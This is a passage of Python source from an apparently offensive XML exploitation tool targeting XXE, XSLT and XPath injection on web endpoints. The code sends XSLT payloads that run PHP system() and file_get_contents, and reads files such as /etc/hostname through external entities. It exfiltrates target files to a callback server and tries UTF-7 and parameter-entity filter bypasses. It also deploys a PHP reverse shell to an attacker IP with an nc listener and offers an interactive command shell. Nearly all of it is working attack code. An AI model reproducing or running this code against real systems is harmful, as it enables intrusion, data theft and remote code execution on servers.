                phpver_direct = '<xsl:value-of select="php:function(\'phpversion\')" xmlns:php="http://php.net/xsl" />'
                response = self.send_payload(phpver_direct, "XSLT PHP version")
                
                if response and ('PHP' in response.text or any(char.isdigit() for char in response.text[:100])):
                    # Check if response is different from baseline
                    baseline = self.send_payload('test', 'baseline')
                    if baseline and response.text != baseline.text:
                        print(f"{Colors.WARNING}[!] PHP functions appear to be available{Colors.RESET}")
                        print(f"{Colors.INFO}[*] phpversion() executed{Colors.RESET}")
                        vuln_found = True
        
        # Fallback: Try full document payloads (for POST or traditional XXE)
        if not vuln_found:
            print(f"{Colors.INFO}[*] Testing full XSLT document payloads{Colors.RESET}")
            php_payloads = PayloadGenerator.xslt_rce_php()
            
            for idx, payload in enumerate(php_payloads, 1):
                response = self.send_payload(payload, f"XSLT PHP RCE #{idx}")
                
                if response and ('root:' in response.text or 'uid=' in response.text):
                    print(f"{Colors.SUCCESS}[+] XSLT PHP RCE Detected!{Colors.RESET}")
                    print(f"\n{Colors.INFO}[*] Command Output:{Colors.RESET}")
                    print(response.text[:500])
                    
                    self.vulnerabilities_found.append({
                        'type': 'XSLT PHP RCE',
                        'payload': payload
                    })
                    vuln_found = True
                    break
        
        # Test 8: .NET XSLT RCE
        print(f"\n{Colors.INFO}[*] Test 8: .NET XSLT RCE{Colors.RESET}")
        dotnet_payload = PayloadGenerator.xslt_rce_dotnet()
        response = self.send_payload(dotnet_payload, "XSLT .NET RCE")
        
        if response and ('\\' in response.text or 'BEGIN OUTPUT' in response.text):
            print(f"{Colors.SUCCESS}[+] XSLT .NET RCE Detected!{Colors.RESET}")
            self.vulnerabilities_found.append({
                'type': 'XSLT .NET RCE',
                'payload': dotnet_payload
            })
            vuln_found = True
        
        if vuln_found:
            print(f"\n{Colors.ERROR}[!] XSLT Injection vulnerability confirmed!{Colors.RESET}")
            print(f"{Colors.WARNING}[!] XSLT can read files, execute code, and perform SSRF{Colors.RESET}")
            return True
        else:
            print(f"\n{Colors.WARNING}[-] XSLT injection not detected or heavily filtered{Colors.RESET}")
            return False
    
    def test_xpath_injection(self) -> bool:
        """Test for XPATH injection"""
        print(f"\n{Colors.HEADER}[*] Testing XPATH Injection{Colors.RESET}")
        
        payloads = PayloadGenerator.xpath_injection_payloads()
        baseline_response = self.send_payload('<root>test</root>', "Baseline")
        
        if not baseline_response:
            return False
        
        baseline_length = len(baseline_response.text)
        
        for payload in payloads:
            xml_with_injection = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<query>{payload}</query>
</root>'''
            
            response = self.send_payload(xml_with_injection, f"XPATH: {payload}")
            
            if response:
                # Check for significant response differences
                length_diff = abs(len(response.text) - baseline_length)
                if length_diff > 100 or response.status_code != baseline_response.status_code:
                    print(f"{Colors.SUCCESS}[+] Potential XPATH Injection Detected!{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Payload: {payload}{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Length difference: {length_diff}{Colors.RESET}")
                    
                    self.vulnerabilities_found.append({
                        'type': 'XPATH Injection',
                        'payload': payload
                    })
                    return True
        
        print(f"{Colors.WARNING}[-] XPATH injection not detected{Colors.RESET}")
        return False
    
    def exploit_oob_http(self) -> bool:
        """Exploit XXE with OOB HTTP callback"""
        if not self.callback_url:
            print(f"{Colors.WARNING}[-] Callback URL required for OOB exploitation{Colors.RESET}")
            return False
        
        print(f"\n{Colors.HEADER}[*] Exploiting XXE with OOB HTTP{Colors.RESET}")
        print(f"{Colors.INFO}[*] Callback URL: {self.callback_url}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target file: {self.file_path}{Colors.RESET}")
        
        # Start OOB server
        self._start_oob_server()
        
        # Generate and send payload
        xml_payload, dtd_payload = PayloadGenerator.xxe_oob_http(
            self.callback_url,
            self.file_path
        )
        
        OOBServer.dtd_payload = dtd_payload
        
        print(f"\n{Colors.INFO}[*] Sending OOB payload...{Colors.RESET}")
        response = self.send_payload(xml_payload, "OOB HTTP XXE")
        
        if response:
            print(f"{Colors.SUCCESS}[+] Payload sent! Waiting for callback...{Colors.RESET}")
            print(f"{Colors.INFO}[*] Check OOB server output above for exfiltrated data{Colors.RESET}")
            time.sleep(5)
            
            if OOBServer.captured_data:
                print(f"\n{Colors.SUCCESS}[+] Data successfully exfiltrated via OOB!{Colors.RESET}")
                return True
        
        return False
    
    def _start_oob_server(self):
        """Start OOB HTTP server in background thread"""
        print(f"{Colors.INFO}[*] Starting OOB server on port {self.callback_port}...{Colors.RESET}")
        
        def run_server():
            server = HTTPServer(('0.0.0.0', self.callback_port), OOBServer)
            server.timeout = 1
            for _ in range(10):  # Run for 10 seconds
                server.handle_request()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        time.sleep(1)
        print(f"{Colors.SUCCESS}[+] OOB server started{Colors.RESET}")
    
    def deploy_reverse_shell(self, attacker_ip: str, attacker_port: int):
        """Deploy reverse shell via XXE"""
        print(f"\n{Colors.HEADER}[*] Deploying Reverse Shell{Colors.RESET}")
        print(f"{Colors.INFO}[*] Attacker: {attacker_ip}:{attacker_port}{Colors.RESET}")
        
        # Generate PHP reverse shell
        write_payload, execute_payload = PayloadGenerator.xxe_reverse_shell_php(
            attacker_ip,
            attacker_port
        )
        
        # Start listener
        print(f"\n{Colors.INFO}[*] Start your listener: nc -lvnp {attacker_port}{Colors.RESET}")
        input(f"{Colors.WARNING}[!] Press Enter when listener is ready...{Colors.RESET}")
        
        # Write shell
        print(f"{Colors.INFO}[*] Writing shell to target...{Colors.RESET}")
        self.send_payload(write_payload, "Deploy Shell - Write")
        
        time.sleep(2)
        
        # Execute shell
        print(f"{Colors.INFO}[*] Executing shell...{Colors.RESET}")
        self.send_payload(execute_payload, "Deploy Shell - Execute")
        
        print(f"{Colors.SUCCESS}[+] Shell deployment attempted!{Colors.RESET}")
        print(f"{Colors.INFO}[*] Check your listener for connection{Colors.RESET}")
    
    def interactive_exploit(self):
        """Interactive command execution mode"""
        print(f"\n{Colors.HEADER}[*] Interactive Exploitation Mode{Colors.RESET}")
        print(f"{Colors.INFO}[*] Using expect wrapper for command execution{Colors.RESET}")
        print(f"{Colors.WARNING}[!] Type 'exit' to quit{Colors.RESET}\n")
        
        while True:
            try:
                command = input(f"{Colors.SUCCESS}xxe-shell> {Colors.RESET}")
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if not command.strip():
                    continue
                
                # Generate payload with expect wrapper
                payload = PayloadGenerator.xxe_expect_rce(command)
                response = self.send_payload(payload, f"Command: {command}")
                
                if response:
                    print(f"\n{Colors.INFO}[*] Output:{Colors.RESET}")
                    # Try to extract command output from response
                    output = self._extract_output(response.text)
                    print(output if output else response.text[:500])
                    print()
                
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Exiting...{Colors.RESET}")
                break
            except Exception as e:
                print(f"{Colors.ERROR}[-] Error: {str(e)}{Colors.RESET}")
    
    def _extract_output(self, text: str) -> str:
        """Extract command output from XML response"""
        # Try to find content between common XML tags
        patterns = [
            r'<root>(.*?)</root>',
            r'<output>(.*?)</output>',
            r'<result>(.*?)</result>',
            r'<data>(.*?)</data>'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, text, re.DOTALL)
            if match:
                return match.group(1).strip()
        
        return text
    

    # ═══════════════════════════════════════════════════════════════
    # NOTE: Advanced test methods integrated from advanced_payloads.py
    # All 50+ payloads are now accessible via PayloadGenerator class
    # Advanced tests run when --advanced flag is used
    # ═══════════════════════════════════════════════════════════════
    
    def _quick_test_xslt(self) -> dict:
        """
        Quick XSLT injection detection
        XSLT enables transformation of XML documents with XSL elements
        Injection occurs when user input is inserted into XSL data
        
        Detection method:
        1. Inject broken XML tag '<' to provoke server error
        2. If error occurs, test with XSLT system-property elements
        """
        result = {'vulnerable': False, 'severity': 'NONE', 'type': 'XSLT', 'findings': []}
        
        print(f"{Colors.INFO}[*] Testing XSLT transformation processing...{Colors.RESET}")
        
        # Test 0: Broken XML tag test
        print(f"{Colors.INFO}[*] Test 0: Broken XML tag injection '<' (error provocation){Colors.RESET}")
        broken_xml = '<'
        response = self.send_payload(broken_xml, "XSLT Broken XML")
        
        if response and (response.status_code >= 500 or 'error' in response.text.lower() or 'exception' in response.text.lower() or 'parser' in response.text.lower()):
            print(f"{Colors.SUCCESS}[✓] Server error detected with broken XML!{Colors.RESET}")
            print(f"{Colors.WARNING}[!] May indicate XML/XSLT processing - continuing tests...{Colors.RESET}")
            result['findings'].append("Server error on malformed XML (potential injection point)")
        
        # Test 1: Complete system property enumeration
        # This confirms XSLT injection if successful
        print(f"\n{Colors.INFO}[*] Test 1: Complete system property enumeration{Colors.RESET}")
        print(f"{Colors.INFO}[*] Testing comprehensive XSLT system-property() payload...{Colors.RESET}")
        
        xslt_sysinfo_complete = '''Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />'''
        
        response = self.send_payload(xslt_sysinfo_complete, "XSLT System Properties")
        
        if response and ('version' in response.text.lower() or 'vendor' in response.text.lower() or 'product' in response.text.lower()):
            result['vulnerable'] = True
            print(f"{Colors.SUCCESS}[✓] XSLT INJECTION CONFIRMED!{Colors.RESET}")
            print(f"{Colors.SUCCESS}[✓] System properties revealed in response{Colors.RESET}")
            
            # Identify processor and set severity
            if 'libxslt' in response.text.lower():
                result['severity'] = 'CRITICAL'
                result['findings'].append("XSLT Processor: libxslt (PHP-based)")
                result['findings'].append("PHP functions likely supported")
                result['findings'].append("Local File Inclusion (LFI) possible")
                result['findings'].append("Remote Code Execution (RCE) possible")
                print(f"{Colors.ERROR}[!] CRITICAL: libxslt processor detected!{Colors.RESET}")
                print(f"{Colors.WARNING}[!] PHP functions supported - file_get_contents() and system() available!{Colors.RESET}")
            elif 'saxon' in response.text.lower():
                result['severity'] = 'CRITICAL'
                result['findings'].append("XSLT Processor: Saxon (Java-based)")
                result['findings'].append("XSLT 2.0 likely supported (unparsed-text available)")
                print(f"{Colors.ERROR}[!] CRITICAL: Saxon processor detected!{Colors.RESET}")
            elif 'msxml' in response.text.lower() or 'microsoft' in response.text.lower():
                result['severity'] = 'CRITICAL'
                result['findings'].append("XSLT Processor: MSXML (.NET-based)")
                print(f"{Colors.ERROR}[!] CRITICAL: MSXML processor detected!{Colors.RESET}")
            else:
                result['severity'] = 'HIGH'
                result['findings'].append("XSLT processing active (processor unknown)")
            
            # Check version
            if '1.0' in response.text:
                result['findings'].append("XSLT version 1.0")
                print(f"{Colors.INFO}[*] XSLT Version: 1.0{Colors.RESET}")
            elif '2.0' in response.text:
                result['findings'].append("XSLT version 2.0 (unparsed-text() available)")
                print(f"{Colors.INFO}[*] XSLT Version: 2.0{Colors.RESET}")
        
        # Test 2: Direct XSLT element injection (for parameter injection scenarios)
        if not result['vulnerable']:
            print(f"\n{Colors.INFO}[*] Test 2: Direct XSLT element injection (common in forms){Colors.RESET}")
            
            # First get a baseline with normal text
            baseline_payload = 'testuser123'
            baseline_response = self.send_payload(baseline_payload, "Baseline test")
            baseline_text = baseline_response.text if baseline_response else ""
            baseline_length = len(baseline_text)
            
            if self.verbose:
                print(f"{Colors.INFO}[*] Baseline response length: {baseline_length}{Colors.RESET}")
            
            # Test simple value-of that should output version number
            simple_valueof = '<xsl:value-of select="system-property(\'xsl:version\')" />'
            response = self.send_payload(simple_valueof, "XSLT Direct Element")
            
            if response:
                response_text = response.text
                response_length = len(response_text)
                
                if self.verbose:
                    print(f"{Colors.INFO}[*] XSLT test response length: {response_length}{Colors.RESET}")
                    print(f"{Colors.INFO}[*] Length difference: {abs(response_length - baseline_length)}{Colors.RESET}")
                
                # Check if the XSLT was processed - look for version numbers or significant changes
                if ('1.0' in response_text or '2.0' in response_text or '1.1' in response_text) and \
                   ('1.0' not in baseline_text and '2.0' not in baseline_text):
                    result['vulnerable'] = True
                    result['severity'] = 'HIGH'
                    result['findings'].append("XSLT direct element injection works")
                    result['findings'].append("User input reflected in XSLT processing")
                    print(f"{Colors.SUCCESS}[✓] XSLT element injection detected!{Colors.RESET}")
                    print(f"{Colors.INFO}[*] User input is processed as XSLT{Colors.RESET}")
                    print(f"{Colors.INFO}[*] XSLT version found in response: {response_text[max(0,response_text.find('1.')-10):response_text.find('1.')+20] if '1.' in response_text else 'detected'}{Colors.RESET}")
                # Check for any significant response change
                elif abs(response_length - baseline_length) > 50 and response_text != baseline_text:
                    # Something changed significantly - might be XSLT processing
                    print(f"{Colors.WARNING}[!] Significant response change detected ({abs(response_length - baseline_length)} bytes){Colors.RESET}")
                    print(f"{Colors.INFO}[*] Testing more specifically...{Colors.RESET}")
        
        # Test 3: PHP function test (most reliable for detection)
        if not result['vulnerable']:
            print(f"\n{Colors.INFO}[*] Test 3: Testing PHP function support (file_get_contents){Colors.RESET}")
            
            # Get baseline if not already done
            if not baseline_response:
                baseline_payload = 'testuser456'
                baseline_response = self.send_payload(baseline_payload, "Baseline test 2")
                baseline_text = baseline_response.text if baseline_response else ""
                baseline_length = len(baseline_text)
            
            # Try multiple PHP function payloads with proper namespace
            php_payloads = [
                ('<xsl:value-of select="php:function(\'file_get_contents\',\'/etc/hostname\')" xmlns:php="http://php.net/xsl" />', 'file_get_contents'),
                ('Version: <xsl:value-of select="php:function(\'phpversion\')" xmlns:php="http://php.net/xsl" />', 'phpversion'),
                ('<xsl:value-of select="php:function(\'system\',\'id\')" xmlns:php="http://php.net/xsl" />', 'system id'),
            ]
            
            for php_payload, test_name in php_payloads:
                response = self.send_payload(php_payload, f"XSLT PHP Test - {test_name}")
                
                if response and len(response.text) > 50:
                    response_text = response.text
                    response_length = len(response_text)
                    
                    if self.verbose:
                        print(f"{Colors.INFO}[*] PHP test response length: {response_length}{Colors.RESET}")
                        print(f"{Colors.INFO}[*] Baseline length: {baseline_length}{Colors.RESET}")
                        print(f"{Colors.INFO}[*] Difference: {abs(response_length - baseline_length)}{Colors.RESET}")
                    
                    # Check for successful PHP function execution indicators
                    php_indicators = [
                        'uid=' in response_text,  # from id command
                        'gid=' in response_text,  # from id command  
                        'PHP/' in response_text or 'php' in response_text.lower(),  # from phpversion
                        abs(response_length - baseline_length) > 15  # Significant change
                    ]
                    
                    if any(php_indicators):
                        result['vulnerable'] = True
                        result['severity'] = 'CRITICAL'
                        result['findings'].append("XSLT PHP functions available!")
                        result['findings'].append("file_get_contents() works - LFI possible")
                        result['findings'].append("system() likely works - RCE possible")
                        print(f"{Colors.ERROR}[!] CRITICAL: XSLT PHP functions detected!{Colors.RESET}")
                        print(f"{Colors.ERROR}[!] LFI and RCE possible via php:function(){Colors.RESET}")
                        if 'uid=' in response_text:
                            print(f"{Colors.SUCCESS}[✓] RCE confirmed - system() executed 'id' command!{Colors.RESET}")
                        break
        
        # Test 4: Basic XSLT processing with value-of (fallback)
        xslt_basic = '''<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <result>XSLT_GHOST_MARKER_999</result>
    </xsl:template>
</xsl:stylesheet>'''
        
        response = self.send_payload(xslt_basic, "XSLT Basic Test")
        if response and 'XSLT_GHOST_MARKER_999' in response.text:
            result['vulnerable'] = True
            result['severity'] = 'HIGH'
            result['findings'].append("XSLT transformation active - Basic test")
            print(f"{Colors.SUCCESS}[✓] XSLT processing detected (basic transformation)!{Colors.RESET}")
        
        # Test 2: XSLT with embedded stylesheet reference
        xslt_embedded = '''<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
<!DOCTYPE root [
  <!ATTLIST xsl:stylesheet id ID #REQUIRED>
]>
<root>
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <output>XSLT_EMBEDDED_TEST_777</output>
    </xsl:template>
  </xsl:stylesheet>
  <data>test</data>
</root>'''
        
        response = self.send_payload(xslt_embedded, "XSLT Embedded Test")
        if response and 'XSLT_EMBEDDED_TEST_777' in response.text:
            result['vulnerable'] = True
            result['severity'] = 'HIGH'
            result['findings'].append("XSLT transformation active - Embedded stylesheet")
            print(f"{Colors.SUCCESS}[✓] XSLT processing detected (embedded stylesheet)!{Colors.RESET}")
        
        # Test 3: XSLT with for-each loop (more complex)
        xslt_foreach = '''<?xml version="1.0"?>
<root>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <xsl:for-each select="root">
        <item>XSLT_LOOP_TEST_555</item>
      </xsl:for-each>
    </xsl:template>
  </xsl:stylesheet>
  <data>test</data>
</root>'''
        
        response = self.send_payload(xslt_foreach, "XSLT Loop Test")
        if response and 'XSLT_LOOP_TEST_555' in response.text:
            result['vulnerable'] = True
            result['severity'] = 'HIGH'
            result['findings'].append("XSLT transformation active - for-each loops work")
            print(f"{Colors.SUCCESS}[✓] XSLT for-each processing detected!{Colors.RESET}")
        
        # Test 4: XSLT system property extraction (can reveal XSLT processor)
        xslt_sysinfo = '''<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
<!DOCTYPE root [
  <!ATTLIST xsl:stylesheet id ID #REQUIRED>
]>
<root>
  <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
      <info>
        <version><xsl:value-of select="system-property('xsl:version')"/></version>
        <vendor><xsl:value-of select="system-property('xsl:vendor')"/></vendor>
      </info>
    </xsl:template>
  </xsl:stylesheet>
</root>'''
        
        response = self.send_payload(xslt_sysinfo, "XSLT System Info")
        if response and ('version' in response.text.lower() or 'vendor' in response.text.lower() or '1.0' in response.text):
            result['vulnerable'] = True
            result['severity'] = 'HIGH'
            result['findings'].append("XSLT system properties accessible")
            print(f"{Colors.SUCCESS}[✓] XSLT system-property() function works!{Colors.RESET}")
            
            # Try to determine severity based on system info
            if 'libxslt' in response.text.lower() or 'saxon' in response.text.lower():
                result['severity'] = 'CRITICAL'
                result['findings'].append(f"XSLT processor identified (may allow file read)")
        
        if result['vulnerable']:
            print(f"{Colors.WARNING}[!] XSLT Injection vulnerability detected!{Colors.RESET}")
            print(f"{Colors.INFO}[*] XSLT can transform XML and potentially read files{Colors.RESET}")
        
        return result
    
    def _quick_test_xpath(self) -> dict:
        """Quick XPATH injection detection"""
        result = {'vulnerable': False, 'severity': 'NONE', 'type': 'XPATH', 'findings': []}
        
        # XPATH injection test
        xpath_payload = '''<?xml version="1.0"?>
<root>
  <search>' or '1'='1</search>
</root>'''
        
        response = self.send_payload(xpath_payload, "XPATH Detection")
        if response:
            # Check for XPATH errors or different response
            xpath_indicators = ['xpath', 'xml path', 'expression error', 'syntax']
            if any(ind in response.text.lower() for ind in xpath_indicators):
                result['vulnerable'] = True
                result['severity'] = 'HIGH'
                result['findings'].append("XPATH injection possible")
                print(f"{Colors.SUCCESS}[✓] XPATH injection detected!{Colors.RESET}")
        
        return result
    
    def discover_xxe_vulnerability(self) -> dict:
        """
        Comprehensive XML vulnerability discovery scan
        Tests for: XXE, XSLT Injection, XPATH Injection
        Returns categorized results with targeted exploitation commands
        """
        print(f"\n{Colors.HEADER}╔═══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.HEADER}║        XML VULNERABILITY DISCOVERY & CLASSIFICATION SCAN              ║{Colors.RESET}")
        print(f"{Colors.HEADER}╚═══════════════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
        
        print(f"{Colors.INFO}[*] Testing for: XXE, XSLT Injection, XPATH Injection{Colors.RESET}")
        print(f"{Colors.INFO}[*] Target: {self.target_url}{Colors.RESET}")
        print(f"{Colors.INFO}[*] Method: {self.method}{Colors.RESET}\n")
        
        results = {
            'accepts_xml': False,
            'processes_entities': False,
            'vulnerable': False,
            'severity': 'none',
            'confidence': 'none',
            'findings': [],
            'next_steps': [],
            'vulnerabilities': []  # List of vulnerability types found
        }
        
        # Test 0: Parser fingerprint + content-type acceptance matrix -- both
        # feed the classification below and cost only a handful of requests.
        try:
            dtd_blocked = self.fingerprint_parser()
            if self.parser_fingerprint:
                results['findings'].append(f"Parser: {self.parser_fingerprint}")
            if dtd_blocked:
                results['findings'].append("Parser reports DTD processing blocked")
                results['next_steps'].append("Try UTF-16/UTF-7 encoding bypasses and XInclude")
            self.enumerate_content_types()
            for content_type in self.accepted_content_types:
                results['findings'].append(f"Parses XML as: {content_type}")
        except Exception:
            pass

        # Test 1: Check if endpoint accepts XML
        print(f"{Colors.INFO}[*] Test 1/5: Checking if endpoint accepts XML input{Colors.RESET}")
        
        simple_xml_payloads = [
            ('Basic XML', '<?xml version="1.0"?><root><test>hello</test></root>'),
            ('With DOCTYPE', '<?xml version="1.0"?><!DOCTYPE root><root><test>hello</test></root>'),
            ('With encoding', '<?xml version="1.0" encoding="UTF-8"?><root><test>hello</test></root>'),
        ]
        
        xml_accepted = False
        for name, payload in simple_xml_payloads:
            response = self.send_payload(payload, f"XML Acceptance Test - {name}")
            if response:
                # Check if server processed it without error
                if response.status_code < 500:
                    xml_accepted = True
                    print(f"{Colors.SUCCESS}[+] Endpoint accepts XML input!{Colors.RESET}")
                    results['accepts_xml'] = True
                    results['findings'].append(f"Endpoint accepts {name}")
                    break
        
        if not xml_accepted:
            print(f"{Colors.WARNING}[-] Endpoint may not accept XML or requires specific format{Colors.RESET}")
            print(f"{Colors.INFO}[*] This doesn't mean it's not vulnerable - try with JSON-to-XML conversion{Colors.RESET}")
            results['next_steps'].append("Try changing Content-Type to application/xml")
            results['next_steps'].append("Try XML in POST data even if endpoint expects JSON")
        
        # Test 2: Check if internal entities are processed
        print(f"\n{Colors.INFO}[*] Test 2/5: Testing internal entity processing{Colors.RESET}")
        
        entity_tests = [
            ('Simple Entity', 'GHOST_TEST_123', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test "GHOST_TEST_123">
]>
<root><test>&test;</test></root>'''),
            ('Numeric Entity', 'NUMERIC_456', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY num "NUMERIC_456">
]>
<root><data>&num;</data></root>'''),
            ('Multiple Elements', 'ENTITY_WORKS_789', '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY ghost "ENTITY_WORKS_789">
]>
<root>
<name>test</name>
<email>&ghost;</email>
<message>test</message>
</root>'''),
        ]
        
        entity_processing = False
        for test_name, test_value, payload in entity_tests:
            response = self.send_payload(payload, f"Entity Test - {test_name}")
            if response and test_value in response.text:
                entity_processing = True
                print(f"{Colors.SUCCESS}[+] Internal entities ARE processed!{Colors.RESET}")
                print(f"{Colors.SUCCESS}[+] Test value '{test_value}' found in response{Colors.RESET}")
                results['processes_entities'] = True
                results['findings'].append(f"Entity substitution works ({test_name})")
                break
        
        if not entity_processing:
            print(f"{Colors.WARNING}[-] Internal entities not processed or not reflected{Colors.RESET}")
            print(f"{Colors.INFO}[*] May still be vulnerable via blind/OOB XXE{Colors.RESET}")
            results['next_steps'].append("Try Out-of-Band (OOB) XXE testing")
        
        # Test 3: Test external entity with safe local resource
        print(f"\n{Colors.INFO}[*] Test 3/5: Testing external entity support{Colors.RESET}")
        
        external_entity_tests = [
            ('File Protocol', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><test>&xxe;</test></root>'''),
            ('HTTP Protocol', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1/">
]>
<root><test>&xxe;</test></root>'''),
        ]
        
        external_entity_support = False
        for test_name, payload in external_entity_tests:
            response = self.send_payload(payload, f"External Entity Test - {test_name}")
            if response:
                # Look for signs of external entity processing
                if len(response.text) > 100 and any(indicator in response.text.lower() 
                    for indicator in ['root', 'localhost', 'html', 'http']):
                    external_entity_support = True
                    print(f"{Colors.SUCCESS}[+] External entities ARE supported!{Colors.RESET}")
                    print(f"{Colors.SUCCESS}[+] {test_name} worked{Colors.RESET}")
                    results['findings'].append(f"External entities work ({test_name})")
                    break
        
        if not external_entity_support and entity_processing:
            print(f"{Colors.WARNING}[-] External entities may be blocked{Colors.RESET}")
            print(f"{Colors.INFO}[*] But internal entities work - partial XXE possible{Colors.RESET}")
        
        # Test 4: Check for common XXE protection bypasses
        print(f"\n{Colors.INFO}[*] Test 4/5: Testing XXE protection bypasses{Colors.RESET}")
        
        bypass_tests = [
            ('Parameter Entity', '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % param "<!ENTITY test 'BYPASS_TEST'>">
  %param;
]>
<root>&test;</root>'''),
            ('UTF-7 Encoding', '''+ADw?xml version="1.0" encoding="UTF-7"?+AD4
<!DOCTYPE root [<!ENTITY test "UTF7_WORKS">]>
<root>&test;</root>'''),
        ]
        
        bypass_works = False
        for test_name, payload in bypass_tests:
            response = self.send_payload(payload, f"Bypass Test - {test_name}")
            if response and ('BYPASS_TEST' in response.text or 'UTF7_WORKS' in response.text):
                bypass_works = True
                print(f"{Colors.SUCCESS}[+] {test_name} bypass works!{Colors.RESET}")
                results['findings'].append(f"{test_name} bypass successful")
        
        if not bypass_works:
            print(f"{Colors.INFO}[-] Standard bypass techniques didn't work{Colors.RESET}")
        
        # Test 5: Determine vulnerability severity
        print(f"\n{Colors.INFO}[*] Test 5/5: Analyzing vulnerability severity{Colors.RESET}")
        
        if entity_processing and external_entity_support:
            results['vulnerable'] = True
            results['severity'] = 'CRITICAL'
            results['confidence'] = 'HIGH'
            print(f"{Colors.SUCCESS}[+] CRITICAL: Full XXE vulnerability confirmed!{Colors.RESET}")
            results['findings'].append("External entity injection possible")
            results['findings'].append("File disclosure likely")
            results['next_steps'].append("Attempt file read exploitation")
            results['next_steps'].append("Try reading /etc/passwd")
            results['next_steps'].append("Extract PHP source code")
            
        elif entity_processing and not external_entity_support:
            results['vulnerable'] = True
            results['severity'] = 'HIGH'
            results['confidence'] = 'MEDIUM'
            print(f"{Colors.WARNING}[+] HIGH: Partial XXE vulnerability detected{Colors.RESET}")
            print(f"{Colors.INFO}[*] Internal entities work, external may be blocked{Colors.RESET}")
            results['findings'].append("Internal entity injection confirmed")
            results['findings'].append("External entities may be filtered")
            results['next_steps'].append("Try OOB (Out-of-Band) exploitation")
            results['next_steps'].append("Test error-based XXE")
            results['next_steps'].append("Try protocol bypass techniques")
            
        elif xml_accepted and not entity_processing:
            results['vulnerable'] = False
            results['severity'] = 'LOW'
            results['confidence'] = 'LOW'
            print(f"{Colors.INFO}[+] LOW: Endpoint accepts XML but entities not processed{Colors.RESET}")
            results['findings'].append("XML parsing present")
            results['findings'].append("Entity processing disabled or filtered")
            results['next_steps'].append("May still be vulnerable to blind XXE")
            results['next_steps'].append("Try OOB exploitation")
            results['next_steps'].append("Test XSLT injection")
            results['next_steps'].append("Test XPATH injection")
            
        else:
            results['vulnerable'] = False
            results['severity'] = 'NONE'
            results['confidence'] = 'LOW'
            print(f"{Colors.WARNING}[-] No XXE vulnerability detected{Colors.RESET}")
            results['next_steps'].append("Try different Content-Type headers")
            results['next_steps'].append("Test with JSON-to-XML conversion")
            results['next_steps'].append("Check if other endpoints accept XML")
        
        # ═══════════════════════════════════════════════════════════════════
        # ADDITIONAL TESTS: XSLT and XPATH Injection
        # ═══════════════════════════════════════════════════════════════════
        if xml_accepted:
            print(f"\n{Colors.HEADER}[*] Testing for additional XML vulnerabilities...{Colors.RESET}\n")
            
            # Test XSLT Injection
            print(f"{Colors.INFO}[*] Testing XSLT Injection...{Colors.RESET}")
            xslt_result = self._quick_test_xslt()
            if xslt_result['vulnerable']:
                results['vulnerabilities'].append(xslt_result)
                results['vulnerable'] = True
                results['findings'].extend(xslt_result['findings'])
                # Update severity - CRITICAL overrides everything, HIGH overrides MEDIUM/LOW
                if xslt_result['severity'] == 'CRITICAL':
                    results['severity'] = 'CRITICAL'
                    results['confidence'] = 'HIGH'
                elif xslt_result['severity'] == 'HIGH' and results['severity'] not in ['CRITICAL', 'HIGH']:
                    results['severity'] = 'HIGH'
                    results['confidence'] = 'MEDIUM'
                results['next_steps'].append("Exploit XSLT injection with: python3 ghostxxxe.py -u URL --advanced -v")
            else:
                print(f"{Colors.WARNING}[✗] XSLT injection not detected{Colors.RESET}")
            
            # Test XPATH Injection
            print(f"\n{Colors.INFO}[*] Testing XPATH Injection...{Colors.RESET}")
            xpath_result = self._quick_test_xpath()
            if xpath_result['vulnerable']:
                results['vulnerabilities'].append(xpath_result)
                results['vulnerable'] = True
                results['findings'].extend(xpath_result['findings'])
                if xpath_result['severity'] == 'HIGH' and results['severity'] not in ['CRITICAL', 'HIGH']:
                    results['severity'] = 'HIGH'
                results['next_steps'].append("Exploit XPATH injection with: python3 ghostxxxe.py -u URL --advanced -v")
            else:
                print(f"{Colors.WARNING}[✗] XPATH injection not detected{Colors.RESET}")
        
        return results
    
    def print_vulnerability_report(self, results: dict):
        """Print formatted vulnerability discovery report"""
        print(f"\n{Colors.HEADER}{'='*70}{Colors.RESET}")
        print(f"{Colors.HEADER}         XML VULNERABILITY ASSESSMENT REPORT{Colors.RESET}")
        print(f"{Colors.HEADER}{'='*70}{Colors.RESET}\n")
        
        # Target Info
        print(f"{Colors.INFO}Target:{Colors.RESET} {self.target_url}")
        print(f"{Colors.INFO}Method:{Colors.RESET} {self.method}")
        print(f"{Colors.INFO}Timestamp:{Colors.RESET} {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Count vulnerability types
        vuln_types = []
